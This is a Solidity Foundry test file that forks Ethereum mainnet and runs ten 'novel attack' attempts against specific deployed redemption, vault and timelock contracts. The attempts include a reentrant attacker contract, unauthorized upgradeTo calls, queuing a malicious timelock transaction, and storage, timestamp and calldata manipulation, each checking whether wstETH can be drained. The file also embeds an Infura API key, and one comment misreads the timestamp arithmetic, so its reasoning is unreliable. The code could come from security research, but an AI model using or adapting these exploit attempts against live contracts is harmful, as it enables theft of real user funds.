// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

/**
 * NOVEL ATTACK PATHWAYS
 * Non-traditional, creative exploitation attempts
 */
contract NovelAttackPaths is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    // ============ NOVEL 1: STORAGE SLOT COLLISION VIA MAPPING ============
    function test_StorageSlotCollision() public {
        console.log("=== STORAGE SLOT COLLISION ATTACK ===\n");

        // R0 uses mappings. What if we can find an address whose
        // mapping slot collides with a critical storage slot?

        // Critical slots in R0:
        // Slot 0: Owner (Timelock)
        // Slot 4: Config data (delay)
        // Slot 5: Redemption mapping base
        // Slot 6: Amount mapping base

        // For mapping at slot 5: keccak256(abi.encode(address, 5))
        // We need to find address X where keccak256(X, 5) = 0, 4, or other critical slot

        console.log("Searching for colliding addresses...");

        // Try to find if any critical slot can be hit by mapping access
        bytes32 slot0 = bytes32(uint256(0));
        bytes32 slot4 = bytes32(uint256(4));

        // Reverse: what address would map to slot 0?
        // keccak256(abi.encode(addr, 5)) = 0 is essentially impossible
        // But what about hitting slot 4 from a different mapping?

        // Check if user redemption struct can overflow into critical slots
        console.log("Checking struct overflow potential:");

        deal(TASSET, attacker, 10000e18);
        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Attacker's redemption is at: keccak256(abi.encode(attacker, 5))
        bytes32 attackerSlot = keccak256(abi.encode(attacker, uint256(5)));
        console.log("Attacker redemption slot:");
        console.logBytes32(attackerSlot);

        // The array elements are at: keccak256(attackerSlot) + index
        bytes32 arrayBase = keccak256(abi.encodePacked(attackerSlot));
        console.log("Array base slot:");
        console.logBytes32(arrayBase);

        // What if we use a HUGE index that wraps around to slot 0?
        // index = (2^256 - arrayBase) would wrap to slot 0
        uint256 wrapIndex = type(uint256).max - uint256(arrayBase) + 1;
        console.log("Index to wrap to slot 0:", wrapIndex);

        // This is too large to be practical, but what about slot collisions
        // between different users?
    }

    // ============ NOVEL 2: CROSS-MAPPING CONFUSION ============
    function test_CrossMappingConfusion() public {
        console.log("=== CROSS-MAPPING CONFUSION ===\n");

        // What if R0 and R1 share storage layout and we can
        // confuse them by creating matching state?

        // Or what if RC's mapping collides with something?

        // RC mapping is at slot 4
        // What's at RC slot 5?
        bytes32 rcSlot5 = vm.load(RC, bytes32(uint256(5)));
        console.log("RC slot 5:");
        console.logBytes32(rcSlot5);
        console.log("As address:", address(uint160(uint256(rcSlot5))));

        // This is 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a
        // What if this is a predictable CREATE2 address?

        // Let's check if this address has special meaning
        address mystery = address(uint160(uint256(rcSlot5)));

        // Can we deploy code there?
        console.log("Mystery address code:", mystery.code.length);

        if (mystery.code.length == 0) {
            // It's empty! Can we deploy there via CREATE2?
            console.log("*** EMPTY ADDRESS AT RC SLOT 5 ***");

            // If we could deploy a contract at this address that
            // pretends to be registered, we might bypass checks

            // What's the registration check?
            // RC checks: mapping(address => uint256) at slot 4
            // If mystery address maps to non-zero at slot 4, it's registered

            bytes32 mysteryRegKey = keccak256(abi.encode(mystery, uint256(4)));
            bytes32 mysteryRegVal = vm.load(RC, mysteryRegKey);
            console.log("Mystery registration:", uint256(mysteryRegVal));
        }
    }

    // ============ NOVEL 3: DELEGATECALL CONTEXT MANIPULATION ============
    function test_DelegatecallContextManipulation() public {
        console.log("=== DELEGATECALL CONTEXT MANIPULATION ===\n");

        // R0 has DELEGATECALLs. In delegatecall, msg.sender is preserved
        // but storage is the caller's. What if we can manipulate
        // the delegatecall target's behavior via storage?

        // Find all DELEGATECALL targets in R0
        bytes memory code = R0.code;

        console.log("Analyzing DELEGATECALL patterns in R0:");

        // DELEGATECALL at 5323 loads from SLOAD
        // What slot does it load from?

        // From earlier analysis, let's check slots 28-35
        for (uint s = 28; s < 40; s++) {
            bytes32 slot = vm.load(R0, bytes32(s));
            if (slot != bytes32(0)) {
                address target = address(uint160(uint256(slot)));
                console.log("Slot", s, ":");
                console.log("  Address:", target);
                console.log("  Has code:", target.code.length > 0);
            }
        }

        // What if we can make R0 delegatecall to a contract we control
        // by manipulating the storage slot it reads from?

        // The delegatecall target slot might be computed dynamically
        // Let's trace what storage is read during finalizeRedeem

        deal(TASSET, attacker, 10000e18);
        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Record storage before
        bytes32[] memory slotsBefore = new bytes32[](50);
        for (uint i = 0; i < 50; i++) {
            slotsBefore[i] = vm.load(R0, bytes32(i));
        }

        vm.warp(block.timestamp + 7 days + 1);

        // Finalize and see what storage changes
        vm.startPrank(attacker);
        R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        vm.stopPrank();

        console.log("\nStorage changes after finalize:");
        for (uint i = 0; i < 50; i++) {
            bytes32 slotAfter = vm.load(R0, bytes32(i));
            if (slotsBefore[i] != slotAfter) {
                console.log("Slot", i, "changed:");
                console.log("  Before:");
                console.logBytes32(slotsBefore[i]);
                console.log("  After:");
                console.logBytes32(slotAfter);
            }
        }
    }

    // ============ NOVEL 4: SELF-REFERENTIAL CALLBACK ============
    function test_SelfReferentialCallback() public {
        console.log("=== SELF-REFERENTIAL CALLBACK ===\n");

        // Deploy a contract that calls back during redemption process
        SelfReferentialAttacker selfRef = new SelfReferentialAttacker();

        deal(TASSET, address(selfRef), 10000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        selfRef.attack();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 selfRefBal = IERC20(wstETH).balanceOf(address(selfRef));

        console.log("Vault after:", vaultAfter / 1e18);
        console.log("SelfRef wstETH:", selfRefBal / 1e18);

        if (selfRefBal > 0 && block.timestamp < selfRef.startTime() + 7 days) {
            console.log("*** IMMEDIATE DRAIN VIA SELF-REFERENCE ***");
        }
    }

    // ============ NOVEL 5: TIMESTAMP MANIPULATION VIA BLOCK ============
    function test_TimestampManipulationViaBlock() public {
        console.log("=== TIMESTAMP MANIPULATION ===\n");

        // In a real attack, could we manipulate block.timestamp?
        // On PoS Ethereum, validators set timestamp with some flexibility

        // But more interesting: what if the delay calculation has an edge case?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // What if we create redemption at block.timestamp = 0?
        // Or at max uint?

        // Test with current time near overflow boundaries
        console.log("Current block.timestamp:", block.timestamp);

        // What happens if redemption timestamp + delay overflows?
        // Timestamp is stored in lower 32 bits of struct
        // If timestamp = 2^32 - delay, then timestamp + delay wraps to ~0

        // Let's check the actual timestamp check logic
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Get the stored timestamp
        bytes32 arrayBase = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 elemBase = keccak256(abi.encodePacked(arrayBase));
        bytes32 elem0 = vm.load(R0, elemBase);

        uint256 storedTimestamp = uint256(elem0) & 0xFFFFFFFF;
        console.log("Stored timestamp:", storedTimestamp);

        // The check is likely: block.timestamp >= storedTimestamp + delay
        // If storedTimestamp + delay overflows, it becomes small
        // and block.timestamp >= small_number would be true!

        // But storedTimestamp is block.timestamp, which is ~1.7B
        // Overflow would require storedTimestamp + delay > 2^32
        // delay = 604800 (7 days)
        // 2^32 = 4,294,967,296
        // Need storedTimestamp > 4,294,967,296 - 604,800 = 4,294,362,496

        console.log("Overflow threshold: 4294362496");
        console.log("Current timestamp:", block.timestamp);

        // We're way past that! The timestamp already overflowed!
        // block.timestamp ~1.7B, but if stored as uint32 it wraps

        if (storedTimestamp < block.timestamp) {
            console.log("*** TIMESTAMP STORED AS SMALLER TYPE ***");
            console.log("Stored:", storedTimestamp);
            console.log("Current:", block.timestamp);

            // Try immediate finalize
            vm.startPrank(attacker);
            (bool fs,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            console.log("Immediate finalize:", fs);
            vm.stopPrank();

            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("*** GOT wstETH IMMEDIATELY ***");
                console.log("Balance:", bal / 1e18);
            }
        }
    }

    // ============ NOVEL 6: PROXY ADMIN SLOT MANIPULATION ============
    function test_ProxyAdminSlotManipulation() public {
        console.log("=== PROXY ADMIN SLOT MANIPULATION ===\n");

        // EIP-1967 slots:
        // Implementation: keccak256("eip1967.proxy.implementation") - 1
        // Admin: keccak256("eip1967.proxy.admin") - 1
        // Beacon: keccak256("eip1967.proxy.beacon") - 1

        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        bytes32 beaconSlot = bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1);

        console.log("EIP-1967 slots:");
        console.log("Impl slot:");
        console.logBytes32(implSlot);
        console.log("Admin slot:");
        console.logBytes32(adminSlot);

        // Check R0
        console.log("\nR0 EIP-1967:");
        bytes32 r0Impl = vm.load(R0, implSlot);
        bytes32 r0Admin = vm.load(R0, adminSlot);
        console.log("Impl:", address(uint160(uint256(r0Impl))));
        console.log("Admin:", address(uint160(uint256(r0Admin))));

        // Check R1
        console.log("\nR1 EIP-1967:");
        bytes32 r1Impl = vm.load(R1, implSlot);
        bytes32 r1Admin = vm.load(R1, adminSlot);
        console.log("Impl:", address(uint160(uint256(r1Impl))));
        console.log("Admin:", address(uint160(uint256(r1Admin))));

        // Check Vault
        console.log("\nVault EIP-1967:");
        bytes32 vaultImpl = vm.load(VAULT, implSlot);
        bytes32 vaultAdmin = vm.load(VAULT, adminSlot);
        console.log("Impl:", address(uint160(uint256(vaultImpl))));
        console.log("Admin:", address(uint160(uint256(vaultAdmin))));

        // If admin is empty or accessible, we could upgrade
        if (r0Admin == bytes32(0)) {
            console.log("\n*** R0 HAS NO ADMIN - POTENTIAL UPGRADE ***");
        }

        // Check for upgradeToAndCall function
        vm.startPrank(attacker);
        (bool s1,) = R0.call(
            abi.encodeWithSignature("upgradeTo(address)", attacker)
        );
        console.log("\nR0 upgradeTo as attacker:", s1);

        (bool s2,) = R0.call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", attacker, "")
        );
        console.log("R0 upgradeToAndCall:", s2);
        vm.stopPrank();
    }

    // ============ NOVEL 7: TIMELOCK PROPOSAL MANIPULATION ============
    function test_TimelockProposalManipulation() public {
        console.log("=== TIMELOCK PROPOSAL MANIPULATION ===\n");

        console.log("Timelock:", TIMELOCK);
        console.log("Timelock code:", TIMELOCK.code.length);

        // Check timelock storage
        console.log("\nTimelock storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TIMELOCK, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check timelock functions
        bytes4[] memory tlSels = new bytes4[](15);
        tlSels[0] = bytes4(keccak256("delay()"));
        tlSels[1] = bytes4(keccak256("admin()"));
        tlSels[2] = bytes4(keccak256("pendingAdmin()"));
        tlSels[3] = bytes4(keccak256("queuedTransactions(bytes32)"));
        tlSels[4] = bytes4(keccak256("GRACE_PERIOD()"));
        tlSels[5] = bytes4(keccak256("MINIMUM_DELAY()"));
        tlSels[6] = bytes4(keccak256("MAXIMUM_DELAY()"));
        tlSels[7] = bytes4(keccak256("queueTransaction(address,uint256,string,bytes,uint256)"));
        tlSels[8] = bytes4(keccak256("executeTransaction(address,uint256,string,bytes,uint256)"));
        tlSels[9] = bytes4(keccak256("cancelTransaction(address,uint256,string,bytes,uint256)"));

        console.log("\nTimelock view functions:");
        for (uint i = 0; i < 7; i++) {
            (bool s, bytes memory d) = TIMELOCK.staticcall(
                abi.encodeWithSelector(tlSels[i])
            );
            if (s && d.length >= 32) {
                console.logBytes4(tlSels[i]);
                console.log("  ", abi.decode(d, (uint256)));
            }
        }

        // Try to execute a transaction directly
        vm.startPrank(attacker);

        // Queue a malicious transaction
        (bool qs,) = TIMELOCK.call(
            abi.encodeWithSignature(
                "queueTransaction(address,uint256,string,bytes,uint256)",
                RC,
                0,
                "addRedemption(address)",
                abi.encode(attacker),
                block.timestamp + 1
            )
        );
        console.log("\nQueue transaction:", qs);

        vm.stopPrank();
    }

    // ============ NOVEL 8: REDEMPTION STATE MACHINE ATTACK ============
    function test_RedemptionStateMachineAttack() public {
        console.log("=== REDEMPTION STATE MACHINE ATTACK ===\n");

        // What states can a redemption be in?
        // Can we manipulate the state transition?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try to call functions in unexpected order
        console.log("Trying unexpected function sequences:");

        // Cancel then finalize
        (bool c1,) = R0.call(abi.encodeWithSignature("cancelRedeem(uint256)", 0));
        console.log("Cancel:", c1);

        (bool f1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize after cancel:", f1);

        // Create new, try double finalize
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        vm.warp(block.timestamp + 7 days + 1);

        (bool f2,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("First finalize:", f2);

        (bool f3,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Double finalize:", f3);

        // Try negative index (will revert but check)
        // Try very large index

        vm.stopPrank();

        uint256 bal = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", bal / 1e18);
    }

    // ============ NOVEL 9: GAS GRIEFING FOR STATE CORRUPTION ============
    function test_GasGriefingStateCorruption() public {
        console.log("=== GAS GRIEFING STATE CORRUPTION ===\n");

        // What if we can cause out-of-gas at a specific point
        // that leaves state partially updated?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        vm.warp(block.timestamp + 7 days + 1);

        // Try with various gas limits
        uint256[] memory gasLimits = new uint256[](5);
        gasLimits[0] = 50000;
        gasLimits[1] = 100000;
        gasLimits[2] = 150000;
        gasLimits[3] = 200000;
        gasLimits[4] = 300000;

        console.log("Testing with limited gas:");

        for (uint i = 0; i < gasLimits.length; i++) {
            // Reset state for each test
            uint256 snapshot = vm.snapshot();

            vm.startPrank(attacker);
            (bool s,) = R0.call{gas: gasLimits[i]}(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("Gas", gasLimits[i], ":", s);

            if (!s) {
                // Check if state was partially corrupted
                bytes32 arrayBase = keccak256(abi.encode(attacker, uint256(5)));
                bytes32 elemBase = keccak256(abi.encodePacked(arrayBase));
                bytes32 elem0 = vm.load(R0, elemBase);
                console.log("  Redemption state after fail:");
                console.logBytes32(elem0);
            }

            vm.stopPrank();
            vm.revertTo(snapshot);
        }
    }

    // ============ NOVEL 10: SELECTOR COLLISION ATTACK ============
    function test_SelectorCollisionAttack() public {
        console.log("=== SELECTOR COLLISION ATTACK ===\n");

        // What if there's a function selector collision that
        // lets us call a different function than intended?

        // redeem(uint96) = 0x7630c4a8
        // finalizeRedeem(uint256) = 0xaff6cbf1

        // Look for selectors that are close or could be confused
        bytes4 redeemSel = bytes4(keccak256("redeem(uint96)"));
        bytes4 finalizeSel = bytes4(keccak256("finalizeRedeem(uint256)"));

        console.log("redeem selector:");
        console.logBytes4(redeemSel);
        console.log("finalize selector:");
        console.logBytes4(finalizeSel);

        // What functions have similar selectors?
        // Or what if we call with malformed calldata?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Try calling with wrong selector but right data
        console.log("\nTrying malformed calls:");

        // Call finalize selector but with redeem data type
        (bool s1,) = R0.call(abi.encodePacked(finalizeSel, uint96(1000e18)));
        console.log("finalize(uint96):", s1);

        // Call redeem selector but with uint256
        (bool s2,) = R0.call(abi.encodePacked(redeemSel, uint256(1000e18)));
        console.log("redeem(uint256):", s2);

        // Try with extra data
        (bool s3,) = R0.call(abi.encodePacked(redeemSel, uint96(1000e18), uint256(0), address(attacker)));
        console.log("redeem with extra:", s3);

        vm.stopPrank();
    }
}

contract SelfReferentialAttacker {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    uint256 public startTime;
    uint256 public attackPhase;

    function attack() external {
        startTime = block.timestamp;
        attackPhase = 1;

        IERC20(TASSET).approve(R0, type(uint256).max);

        // Initiate redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        attackPhase = 2;

        // Immediately try finalize (should fail normally)
        R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));

        attackPhase = 3;
    }

    // If wstETH transfer triggers this, we re-enter
    receive() external payable {
        if (attackPhase == 2) {
            attackPhase = 4;
            R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }

    fallback() external payable {
        if (attackPhase == 2) {
            attackPhase = 5;
            R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }
}
